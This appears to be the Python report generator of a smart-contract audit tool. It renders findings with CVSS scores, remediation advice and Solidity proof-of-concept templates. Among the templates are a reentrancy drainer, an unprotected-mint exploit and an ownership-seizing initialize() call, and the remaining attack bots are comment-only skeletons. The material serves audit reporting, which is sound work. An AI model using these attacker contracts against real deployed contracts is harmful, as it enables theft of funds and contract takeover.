"""Professional report generator — HTML, JSON, Markdown, PDF.

HTML reports are designed for CISO/executive presentation:
- Executive summary with risk score
- CVSS v3.1 scoring for each finding
- Detailed findings with evidence, PoC, and remediation
- Print-friendly for PDF export

PDF reports use xhtml2pdf for direct HTML→PDF conversion.
"""
import json
import math
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional

# CVSS v3.1 vector component mappings
CVSS_AV = {"NETWORK": "N", "ADJACENT_NETWORK": "A", "LOCAL": "L", "PHYSICAL": "P"}
CVSS_AC = {"LOW": "L", "HIGH": "H"}
CVSS_PR = {"NONE": "N", "LOW": "L", "HIGH": "H"}
CVSS_UI = {"NONE": "N", "REQUIRED": "R"}
CVSS_IMPACT = {"NONE": "N", "LOW": "L", "HIGH": "H"}

# Severity → CVSS base score ranges
SEVERITY_CVSS = {
    "CRITICAL": {"base_min": 9.0, "base_max": 10.0},
    "HIGH": {"base_min": 7.0, "base_max": 8.9},
    "MEDIUM": {"base_min": 4.0, "base_max": 6.9},
    "LOW": {"base_min": 0.1, "base_max": 3.9},
    "INFO": {"base_min": 0.0, "base_max": 0.0},
}

# Attack type → remediation template
REMEDIATION = {
    "reentrancy": "Use Checks-Effects-Interactions pattern. Apply ReentrancyGuard "
                  "from OpenZeppelin on all state-changing functions that make external calls. "
                  "Consider using pull-over-push payment patterns.",
    "mint": "Add access control (onlyOwner, MinterRole, or similar) to all mint functions. "
            "Use OpenZeppelin's AccessControl or Ownable. Consider pausability for emergency stops.",
    "initialize": "Add OpenZeppelin's Initializer/onlyInitializing modifier to all "
                  "initialize functions. Call initialize() in the constructor for non-proxy patterns. "
                  "Use a timelock for proxy upgrades.",
    "delegatecall": "Restrict upgrade functions to a multisig/timelock. Use UUPS pattern with "
                    "authorizeUpgrade guard. Consider using OpenZeppelin's TransparentProxy with "
                    "admin-only upgrade path.",
    "approve": "Restrict approve/setApprovalForAll to the token owner. Consider using "
               "permit (EIP-2612) with deadline instead of unlimited allowances.",
    "selfdestruct": "Remove selfdestruct/kill functions from production contracts. "
                    "If absolutely needed, add timelock + multisig + DAO governance gate.",
    "arbitrarycall": "Restrict execute/call functions to authorized roles. Validate "
                     "target address and calldata. Consider using a whitelist of allowed targets.",
    "oracle": "Use Chainlink price feeds instead of DEX spot prices. If using TWAP, "
              "set observation window ≥ 30 minutes. Implement circuit breakers for extreme "
              "price movements. Use multiple oracle sources with median filtering.",
    "flashloan": "Implement reentrancy guards on all callback functions. Use flash-loan-"
                 "resistant price oracles (TWAP/Chainlink). Add slippage protection and "
                 "flash-loan detection (check msg.sender balance before and after).",
    "governance": "Use snapshot-based voting (getPastVotes) with a checkpoint delay ≥ 1 block. "
                  "Implement flash-loan-resistant governance with time-weighted voting power. "
                  "Add proposal threshold requirements.",
    "bridge": "Implement Merkle proof verification or cryptographic signature verification "
              "for all cross-chain message processing. Use a decentralized validator set. "
              "Add replay protection with nonce tracking.",
    "twap": "Set TWAP observation window ≥ 30 minutes. Use Chainlink oracle as primary "
            "price source. Implement price deviation checks. Add circuit breakers for "
            "extreme market conditions.",
    "crossfunc": "Apply reentrancy guards consistently across ALL functions that share state. "
                 "Use a single reentrancy guard for the entire contract. Ensure state updates "
                 "happen BEFORE external calls in every function.",
    "permit": "Include chainId in the EIP-2612 DOMAIN_SEPARATOR. Use a per-chain domain "
              "separator that includes chainId and verifying contract address. Implement "
              "nonce-based replay protection.",
    "liquidation": "Add oracle-based health factor checks. Implement liquidation queues "
                   "to prevent front-running. Use MEV-resistant mechanisms (e.g., commit-reveal). "
                   "Consider using Flashbots Protect for liquidation transactions.",
    "forcesend": "Use internal accounting (mapping of balances) instead of address(this).balance "
                 "for share price calculation. Implement a buffer/tolerance for small discrepancies. "
                 "Use Chainlink's ETH/USD feed as a sanity check.",
    "peg": "Use Chainlink oracle for collateral pricing instead of DEX spot. Implement "
           "stability fees and liquidation mechanisms. Add collateral ratio enforcement "
           "with on-chain price checks. Use a redemption queue for large withdrawals.",
    "sandwich": "Add slippage protection (amountOutMin) to all swap functions. "
                "Use Flashbots Protect or private mempool for large swaps. "
                "Implement deadline parameters. Consider using DEX aggregators with "
                "built-in MEV protection (e.g., 1inch Fusion, CoW Swap).",
    "frontrun": "Implement commit-reveal schemes for time-sensitive operations. "
                "Use Flashbots Protect or MEV-share for liquidation transactions. "
                "Add deadline parameters to auction/claim functions. Consider using "
                "encrypted mempools (e.g., Threshold Encryption).",
    "mev": "Comprehensive MEV protection: add slippage protection to all swaps, "
           "use commit-reveal for auctions, Flashbots Protect for liquidations, "
           "and consider encrypted mempools for high-value operations. Monitor "
           "mempool for pending frontrunning attacks.",
}

# PoC templates for each attack type
POC_TEMPLATES = {
    "reentrancy": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentrancyAttacker {{
    address public immutable target;
    address public immutable owner;

    constructor(address _target) {{
        target = _target;
        owner = msg.sender;
    }}

    fallback() external payable {{
        // Re-enter after ETH received
        if (address(target).balance > 0) {{
            (bool ok, ) = target.call{{
                value: 0
            }}(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
            // Drain succeeded — sweep to owner
        }}
    }}

    function attack() external {{
        (bool ok, ) = target.call{{
            value: 1 ether
        }}(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
    }}

    receive() external payable {{
        if (address(target).balance > 0) {{
            (bool ok, ) = target.call(abi.encodeWithSignature("withdraw(uint256)", 0));
        }}
    }}
}}""",
    "mint": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Permissionless mint — anyone can call mint() to create tokens
// Attack: call mint(attacker, largeAmount) to inflate supply
contract MintAttacker {{
    function attack(address token) external {{
        // Call token.mint(attacker, 1000000e18) — no access control
        (bool ok, ) = token.call(
            abi.encodeWithSignature("mint(address,uint256)", msg.sender, 1000000e18)
        );
        require(ok, "mint failed");
    }}
}}""",
    "initialize": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Unguarded initialize on upgradeable proxy
// Attack: first caller becomes owner
contract InitializeAttacker {{
    function attack(address proxy) external {{
        // Call initialize(msg.sender) — first caller wins
        (bool ok, ) = proxy.call(
            abi.encodeWithSignature("initialize(address)", msg.sender)
        );
        require(ok, "initialize failed");
    }}
}}""",
    "oracle": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Flash-loan oracle manipulation
// 1. Borrow large amount via flash loan
// 2. Swap on DEX to move spot price
// 3. Exploit protocol that reads manipulated price
// 4. Repay flash loan
contract OracleAttack {{
    function attack(address pool, address tokenIn, address tokenOut) external {{
        // Step 1: Flash loan from Aave
        // Step 2: Swap tokenIn → tokenOut on Uniswap (moves spot price)
        // Step 3: Call protocol function that reads manipulated price
        // Step 4: Repay flash loan + profit
    }}
}}""",
    "sandwich": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Sandwich attack: front-run + back-run a victim's swap
// 1. See pending swap in mempool
// 2. Buy token before victim (price goes up)
// 3. Victim's swap executes at worse price
// 4. Sell token after victim (profit from slippage)
contract SandwichBot {{
    function attack(address router, address tokenIn, address tokenOut) external {{
        // Front-run: buy tokenOut before victim
        // Back-run: sell tokenOut after victim
        // Profit = victim's slippage - gas costs
    }}
}}""",
    "frontrun": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Frontrunning: execute before a pending transaction
// 1. See pending liquidation/auction/claim in mempool
// 2. Submit same tx with higher gas price
// 3. Execute first, capture the profit
contract FrontrunBot {{
    function attack(address target, bytes calldata data) external {{
        // Submit tx with higher gas to execute first
        // Profit from liquidation bonus / auction bid
    }}
}}""",
    "mev": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// MEV extraction: combine sandwich + frontrunning + liquidation
// 1. Monitor mempool for profitable opportunities
// 2. Extract value via sandwich, frontrun, or liquidation
// 3. Use Flashbots to avoid being frontrunned yourself
contract MEVBot {{
    function attack(address[] calldata targets, bytes[] calldata data) external {{
        // Bundle multiple MEV opportunities
        // Submit via Flashbots Protect
    }}
}}""",
}


class ReportGenerator:
    """Generate professional security assessment reports."""

    def generate(self, findings: Dict, format: str = "html",
                 output: str = "report.html") -> str:
        if format == "html":
            return self._gen_html(findings, output)
        elif format == "pdf":
            return self._gen_pdf(findings, output)
        elif format == "markdown":
            return self._gen_markdown(findings, output)
        elif format == "json":
            return self._gen_json(findings, output)
        return ""

    # ------------------------------------------------------------------
    # HTML report — designed for CISO/executive presentation
    # ------------------------------------------------------------------

    def _gen_html(self, findings: Dict, output: str) -> str:
        target = findings.get("target", "Unknown")
        contracts = findings.get("contracts", {})
        vulns = findings.get("vulnerabilities", [])
        scan_time = findings.get("scan_time", datetime.now().isoformat())
        tool_version = findings.get("tool_version", "unknown")
        chain = findings.get("chain", "ethereum")

        # Count by severity
        counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
        for v in vulns:
            sev = v.get("severity", "INFO").upper()
            counts[sev] = counts.get(sev, 0) + 1

        # Risk score (0-100)
        risk_score = self._calculate_risk_score(counts)
        risk_label, risk_color = self._risk_rating(risk_score)

        # Build finding cards
        findings_html = ""
        for i, v in enumerate(vulns, 1):
            findings_html += self._finding_card(v, i)

        # Build contracts table
        contracts_html = ""
        for addr, info in contracts.items():
            name = info.get("name", "Unknown")
            size = info.get("code_size", 0)
            verified = "✅" if info.get("verified") else "❌"
            contracts_html += f"""<tr>
                <td><code class="addr">{addr}</code></td>
                <td>{name}</td>
                <td>{size:,}</td>
                <td>{verified}</td>
            </tr>"""

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Assessment — {target}</title>
<style>
:root {{
    --bg: #0d1117;
    --surface: #161b22;
    --surface-2: #21262d;
    --border: #30363d;
    --text: #e6edf3;
    --text-muted: #8b949e;
    --accent: #58a6ff;
    --critical: #f85149;
    --high: #d29922;
    --medium: #3fb950;
    --low: #8b949e;
    --info: #58a6ff;
}}
* {{ margin: 0; padding: 0; box-sizing: border-box; }}
body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        background: var(--bg); color: var(--text); line-height: 1.6; }}
.container {{ max-width: 1100px; margin: 0 auto; padding: 2rem; }}
header {{ border-bottom: 1px solid var(--border); padding-bottom: 2rem; margin-bottom: 2rem; }}
header h1 {{ font-size: 2rem; margin-bottom: 0.5rem; }}
header .meta {{ color: var(--text-muted); font-size: 0.9rem; }}
.risk-badge {{ display: inline-block; padding: 0.3rem 1rem; border-radius: 6px;
               font-weight: 700; font-size: 1.1rem; }}
.summary-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
                  gap: 1rem; margin: 2rem 0; }}
.summary-card {{ background: var(--surface); border: 1px solid var(--border);
                 border-radius: 8px; padding: 1.2rem; text-align: center; }}
.summary-card .num {{ font-size: 2.5rem; font-weight: 700; }}
.summary-card .label {{ color: var(--text-muted); font-size: 0.85rem; text-transform: uppercase;
                        letter-spacing: 0.05em; }}
.summary-card.critical .num {{ color: var(--critical); }}
.summary-card.high .num {{ color: var(--high); }}
.summary-card.medium .num {{ color: var(--medium); }}
.summary-card.low .num {{ color: var(--low); }}
.summary-card.risk .num {{ color: {risk_color}; }}
h2 {{ margin: 2rem 0 1rem; font-size: 1.4rem; border-bottom: 1px solid var(--border);
      padding-bottom: 0.5rem; }}
table {{ width: 100%; border-collapse: collapse; margin: 1rem 0; }}
th, td {{ padding: 0.75rem 1rem; text-align: left; border-bottom: 1px solid var(--border); }}
th {{ background: var(--surface); font-weight: 600; font-size: 0.85rem;
      text-transform: uppercase; letter-spacing: 0.05em; color: var(--text-muted); }}
tr:hover {{ background: var(--surface); }}
code {{ background: var(--surface-2); padding: 0.2rem 0.5rem; border-radius: 4px;
        font-size: 0.85rem; }}
code.addr {{ font-size: 0.75rem; word-break: break-all; }}
.finding {{ background: var(--surface); border: 1px solid var(--border); border-radius: 8px;
            margin: 1.5rem 0; overflow: hidden; }}
.finding-header {{ padding: 1rem 1.5rem; display: flex; align-items: center; gap: 1rem;
                   border-bottom: 1px solid var(--border); }}
.finding-header .sev {{ padding: 0.2rem 0.7rem; border-radius: 4px; font-weight: 700;
                        font-size: 0.8rem; text-transform: uppercase; }}
.finding-header .title {{ font-weight: 600; font-size: 1.1rem; }}
.finding-header .cvss {{ margin-left: auto; color: var(--text-muted); font-size: 0.85rem; }}
.finding-body {{ padding: 1.5rem; }}
.finding-section {{ margin: 1rem 0; }}
.finding-section h4 {{ color: var(--text-muted); font-size: 0.8rem; text-transform: uppercase;
                       letter-spacing: 0.05em; margin-bottom: 0.5rem; }}
.sev-CRITICAL {{ background: rgba(248, 81, 73, 0.15); border-left: 4px solid var(--critical); }}
.sev-HIGH {{ background: rgba(210, 153, 34, 0.15); border-left: 4px solid var(--high); }}
.sev-MEDIUM {{ background: rgba(63, 185, 80, 0.15); border-left: 4px solid var(--medium); }}
.sev-LOW {{ background: rgba(139, 148, 158, 0.15); border-left: 4px solid var(--low); }}
.sev-INFO {{ background: rgba(88, 166, 255, 0.15); border-left: 4px solid var(--info); }}
.sev-CRITICAL .sev {{ background: var(--critical); color: #fff; }}
.sev-HIGH .sev {{ background: var(--high); color: #000; }}
.sev-MEDIUM .sev {{ background: var(--medium); color: #000; }}
.sev-LOW .sev {{ background: var(--low); color: #000; }}
.sev-INFO .sev {{ background: var(--info); color: #000; }}
pre {{ background: var(--surface-2); border: 1px solid var(--border); border-radius: 6px;
       padding: 1rem; overflow-x: auto; font-size: 0.8rem; line-height: 1.5; }}
.remediation {{ background: var(--surface-2); border: 1px solid var(--border);
               border-radius: 6px; padding: 1rem; font-size: 0.9rem; }}
.evidence {{ background: var(--surface-2); border: 1px solid var(--border);
            border-radius: 6px; padding: 0.8rem 1rem; font-size: 0.85rem;
            font-family: monospace; word-break: break-all; }}
.step-list {{ list-style: none; padding: 0; }}
.step-list li {{ padding: 0.4rem 0; border-bottom: 1px solid var(--border); font-size: 0.9rem; }}
.step-list li:last-child {{ border-bottom: none; }}
.step-list .step-label {{ color: var(--text-muted); }}
footer {{ margin-top: 3rem; padding-top: 2rem; border-top: 1px solid var(--border);
          color: var(--text-muted); font-size: 0.85rem; }}
@media print {{
    body {{ background: #fff; color: #000; }}
    .container {{ max-width: 100%; padding: 1rem; }}
    .finding, .summary-card {{ border: 1px solid #ccc; background: #f9f9f9; }}
    pre {{ background: #f0f0f0; border: 1px solid #ccc; }}
    .sev-CRITICAL {{ background: #fee; border-left-color: #c00; }}
    .sev-HIGH {{ background: #ffd; border-left-color: #a80; }}
    .sev-MEDIUM {{ background: #efe; border-left-color: #090; }}
    .sev-LOW {{ background: #f5f5f5; border-left-color: #666; }}
    .sev-INFO {{ background: #eef; border-left-color: #06c; }}
}}
</style>
</head>
<body>
<div class="container">
<header>
    <h1>🛡️ Smart Contract Security Assessment</h1>
    <div class="meta">
        <strong>Target:</strong> {target} &nbsp;|&nbsp;
        <strong>Chain:</strong> {chain.title()} &nbsp;|&nbsp;
        <strong>Tool:</strong> DeFi Hunter v{tool_version} &nbsp;|&nbsp;
        <strong>Date:</strong> {datetime.fromisoformat(scan_time).strftime('%B %d, %Y at %H:%M UTC')}
    </div>
    <div style="margin-top:1rem;">
        <span class="risk-badge" style="background:{risk_color};color:{'#000' if risk_score < 70 else '#fff'}">
            Risk Score: {risk_score:.0f}/100 — {risk_label}
        </span>
    </div>
</header>

<div class="summary-grid">
    <div class="summary-card critical">
        <div class="num">{counts['CRITICAL']}</div>
        <div class="label">Critical</div>
    </div>
    <div class="summary-card high">
        <div class="num">{counts['HIGH']}</div>
        <div class="label">High</div>
    </div>
    <div class="summary-card medium">
        <div class="num">{counts['MEDIUM']}</div>
        <div class="label">Medium</div>
    </div>
    <div class="summary-card low">
        <div class="num">{counts['LOW'] + counts['INFO']}</div>
        <div class="label">Low / Info</div>
    </div>
    <div class="summary-card risk">
        <div class="num">{risk_score:.0f}</div>
        <div class="label">Risk Score</div>
    </div>
    <div class="summary-card">
        <div class="num">{len(contracts)}</div>
        <div class="label">Contracts</div>
    </div>
</div>

<h2>Executive Summary</h2>
<div style="background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:1.5rem;">
<p>This assessment identified <strong>{len(vulns)} vulnerabilities</strong> across
{len(contracts)} smart contracts on {chain.title()}.</p>
<p style="margin-top:0.5rem;">
{"<strong style='color:var(--critical)'>Immediate action required:</strong> " + str(counts['CRITICAL']) + " critical vulnerabilities allow direct fund theft or contract takeover." if counts['CRITICAL'] > 0 else ""}
{"<strong style='color:var(--high)'>High priority:</strong> " + str(counts['HIGH']) + " high-severity issues require prompt remediation." if counts['HIGH'] > 0 else ""}
{"No critical or high-severity vulnerabilities were identified." if counts['CRITICAL'] == 0 and counts['HIGH'] == 0 else ""}
</p>
</div>

<h2>Contracts Analyzed</h2>
<table>
    <tr><th>Address</th><th>Name</th><th>Code Size</th><th>Verified</th></tr>
    {contracts_html}
</table>

<h2>Detailed Findings</h2>
{findings_html}

<footer>
    <p>Report generated by <strong>DeFi Hunter</strong> v{tool_version} —
    automated smart contract security assessment tool.</p>
    <p>This report is generated by automated analysis and may contain false positives.
    Manual verification is recommended for all findings.</p>
    <p>Scan time: {scan_time}</p>
</footer>
</div>
</body>
</html>"""

        Path(output).write_text(html)
        return output

    def _finding_card(self, vuln: Dict, index: int) -> str:
        sev = vuln.get("severity", "INFO").upper()
        title = vuln.get("title", "Unknown Finding")
        desc = vuln.get("description", "")
        attack = vuln.get("attack", "")
        evidence = vuln.get("evidence", "")
        steps = vuln.get("steps", [])
        endpoint = vuln.get("endpoint", vuln.get("file", ""))
        line = vuln.get("line", "")
        snippet = vuln.get("snippet", "")
        cvss_score = vuln.get("cvss_score", SEVERITY_CVSS.get(sev, {}).get("base_max", 5.0))
        cvss_vector = vuln.get("cvss_vector", "")

        # Remediation
        remediation = vuln.get("remediation", REMEDIATION.get(attack, ""))
        if not remediation:
            remediation = "Manual review recommended. Follow secure development best practices."

        # PoC
        poc = vuln.get("poc", POC_TEMPLATES.get(attack, ""))

        # Steps HTML
        steps_html = ""
        if steps:
            steps_html = '<ul class="step-list">'
            for s in steps:
                step_name = s.get("step", "")
                step_val = s.get("value", "")
                steps_html += f'<li><span class="step-label">{step_name}:</span> {step_val}</li>'
            steps_html += "</ul>"

        # Evidence HTML
        evidence_html = ""
        if evidence:
            evidence_html = f'<div class="evidence">{evidence}</div>'

        # Source location
        location = ""
        if endpoint:
            location = f'<code>{endpoint}</code>'
            if line:
                location += f':<strong>{line}</strong>'
            if snippet:
                location += f'<br><pre style="margin-top:0.5rem">{snippet}</pre>'

        # PoC HTML
        poc_html = ""
        if poc:
            poc_html = f'<pre>{poc}</pre>'

        return f"""
<div class="finding sev-{sev}">
    <div class="finding-header">
        <span class="sev">{sev}</span>
        <span class="title">#{index} {title}</span>
        <span class="cvss">CVSS {cvss_score:.1f}</span>
    </div>
    <div class="finding-body">
        <div class="finding-section">
            <h4>Description</h4>
            <p>{desc}</p>
        </div>
        {"<div class='finding-section'><h4>Location</h4>" + location + "</div>" if location else ""}
        {"<div class='finding-section'><h4>Reproduction Steps</h4>" + steps_html + "</div>" if steps_html else ""}
        {"<div class='finding-section'><h4>Evidence</h4>" + evidence_html + "</div>" if evidence_html else ""}
        <div class="finding-section">
            <h4>Remediation</h4>
            <div class="remediation">{remediation}</div>
        </div>
        {"<div class='finding-section'><h4>Proof of Concept</h4>" + poc_html + "</div>" if poc_html else ""}
    </div>
</div>"""

    def _calculate_risk_score(self, counts: Dict) -> float:
        """Calculate overall risk score (0-100) from vulnerability counts."""
        # Weighted scoring: critical=40, high=25, medium=10, low=3, info=0
        score = (counts.get("CRITICAL", 0) * 40 +
                 counts.get("HIGH", 0) * 25 +
                 counts.get("MEDIUM", 0) * 10 +
                 counts.get("LOW", 0) * 3)
        return min(100.0, score)

    def _risk_rating(self, score: float) -> tuple:
        if score >= 80:
            return "CRITICAL", "#f85149"
        elif score >= 50:
            return "HIGH", "#d29922"
        elif score >= 20:
            return "MEDIUM", "#3fb950"
        elif score > 0:
            return "LOW", "#8b949e"
        return "INFO", "#58a6ff"

    # ------------------------------------------------------------------
    # PDF report — direct HTML→PDF conversion via xhtml2pdf
    # ------------------------------------------------------------------

    def _gen_pdf(self, findings: Dict, output: str) -> str:
        """Generate PDF report from HTML (reuses the HTML layout).

        Uses xhtml2pdf for pure-Python HTML→PDF conversion.
        The PDF is print-ready with proper page breaks and styling.
        """
        # Generate HTML to a temp path, then convert to PDF
        import tempfile
        with tempfile.NamedTemporaryFile(suffix=".html", delete=False) as tmp:
            tmp_path = tmp.name
        try:
            self._gen_html(findings, tmp_path)
            html_content = Path(tmp_path).read_text(encoding="utf-8")

            # Convert HTML to PDF
            try:
                from xhtml2pdf import pisa
                with open(output, "wb") as pdf_file:
                    status = pisa.CreatePDF(
                        src=html_content,
                        dest=pdf_file,
                        encoding="utf-8",
                    )
                if status.err:
                    # Fallback: save as HTML with .pdf extension
                    Path(output).write_text(html_content, encoding="utf-8")
                return output
            except ImportError:
                # xhtml2pdf not installed — save HTML as fallback
                Path(output).write_text(html_content, encoding="utf-8")
                return output
        finally:
            Path(tmp_path).unlink(missing_ok=True)

    # ------------------------------------------------------------------
    # Markdown report
    # ------------------------------------------------------------------

    def _gen_markdown(self, findings: Dict, output: str) -> str:
        target = findings.get("target", "Unknown")
        vulns = findings.get("vulnerabilities", [])
        chain = findings.get("chain", "ethereum")
        tool_version = findings.get("tool_version", "unknown")

        counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
        for v in vulns:
            sev = v.get("severity", "INFO").upper()
            counts[sev] = counts.get(sev, 0) + 1

        risk_score = self._calculate_risk_score(counts)
        risk_label, _ = self._risk_rating(risk_score)

        lines = [
            f"# Security Assessment: {target}",
            f"",
            f"**Chain:** {chain.title()} | **Risk Score:** {risk_score:.0f}/100 ({risk_label}) | "
            f"**Tool:** DeFi Hunter v{tool_version}",
            f"",
            f"## Summary",
            f"",
            f"- 🔴 Critical: {counts['CRITICAL']}",
            f"- 🟠 High: {counts['HIGH']}",
            f"- 🟢 Medium: {counts['MEDIUM']}",
            f"- ⚪ Low/Info: {counts['LOW'] + counts['INFO']}",
            f"",
        ]

        for i, v in enumerate(vulns, 1):
            sev = v.get("severity", "INFO")
            title = v.get("title", "")
            desc = v.get("description", "")
            evidence = v.get("evidence", "")
            remediation = v.get("remediation", REMEDIATION.get(v.get("attack", ""), ""))
            lines.extend([
                f"## #{i} [{sev}] {title}",
                f"",
                f"**Description:** {desc}",
                f"",
            ])
            if evidence:
                lines.extend([f"**Evidence:** `{evidence}`", f""])
            if remediation:
                lines.extend([f"**Remediation:** {remediation}", f""])

        Path(output).write_text("\n".join(lines))
        return output

    # ------------------------------------------------------------------
    # JSON report (structured)
    # ------------------------------------------------------------------

    def _gen_json(self, findings: Dict, output: str) -> str:
        vulns = findings.get("vulnerabilities", [])
        counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
        for v in vulns:
            sev = v.get("severity", "INFO").upper()
            counts[sev] = counts.get(sev, 0) + 1

        enriched = {
            "target": findings.get("target"),
            "chain": findings.get("chain", "ethereum"),
            "scan_time": findings.get("scan_time", datetime.now().isoformat()),
            "tool_version": findings.get("tool_version", "unknown"),
            "risk_score": self._calculate_risk_score(counts),
            "summary": counts,
            "contracts": findings.get("contracts", {}),
            "vulnerabilities": vulns,
        }
        Path(output).write_text(json.dumps(enriched, indent=2))
        return output
